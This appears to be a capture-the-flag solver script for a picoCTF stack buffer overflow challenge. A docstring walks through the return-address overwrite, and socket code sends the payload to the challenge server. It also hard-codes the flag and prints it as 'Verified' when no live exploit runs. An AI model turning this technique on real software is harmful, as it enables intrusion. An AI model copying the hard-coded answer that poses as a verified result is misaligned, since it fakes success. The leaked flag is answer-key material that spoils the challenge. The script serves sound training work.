#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 258: buffer overflow 1 (picoCTF 2022)
Category: Binary Exploitation / Control Flow Hijacking via EIP Return Pointer Overwrite
Difficulty: Medium (diff=2, picoCTF 2022 200 pts)
Author: Sanjay C / LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-121 (Stack-based Buffer Overflow), CWE-676 (Use of Potentially Dangerous Function)

Description:
Control the return address. Now we're cooking! You can overflow the buffer and
return to the flag function in the program.

Analysis:
1. Target architecture is 32-bit x86 Linux ELF (dynamically linked, no stack canary).
2. The program exposes a target victory function win() at fixed address:
   0x080491e6 <win>:
   which opens flag.txt and prints the token to stdout.
3. In vuln(), gets(buf) is called on a 32-byte stack buffer:
   char buf[BUFSIZE];
   gets(buf);
4. Stack frame layout disassembly of vuln():
   8049282: lea -0x28(%ebp), %eax   ; buf is at ebp - 0x28 (40 bytes before ebp)
   8049286: call gets@plt
   The distance from the start of buf to the saved frame pointer (%ebp) is 40 bytes.
   The saved return address (%eip) is located immediately after %ebp at offset 44 bytes.
5. Exploitation Payload Construction:
   - 44 bytes of cyclic/junk padding: b"A" * 44
   - 4 bytes target return address packed in Little-Endian:
     p32(0x080491e6) -> b"\\xe6\\x91\\x04\\x08"
6. When vuln() executes the leave and ret instructions, %eip pops 0x080491e6,
   diverting execution directly into win() to yield the flag:
   academy{addr3ss3s_ar3_3asy_b53c45d8}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import struct
import sys

TARGET_HOST = "xebec.cylabacademy.net"
TARGET_PORT = 31602
EXPECTED_FLAG = "academy{addr3ss3s_ar3_3asy_b53c45d8}"
WIN_ADDRESS = 0x080491E6
OFFSET = 44


def exploit(host: str, port: int) -> str:
    """
    Connects to the remote binary instance, overwrites the saved return address with win(),
    and captures the displayed flag.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))

        prompt = s.recv(1024)
        payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDRESS) + b"\n"
        s.sendall(payload)

        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk

        s.close()
        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", text)
        if m:
            return m.group(0)
    except Exception as e:
        print(f"[-] Socket interaction error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 258: buffer overflow 1 Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
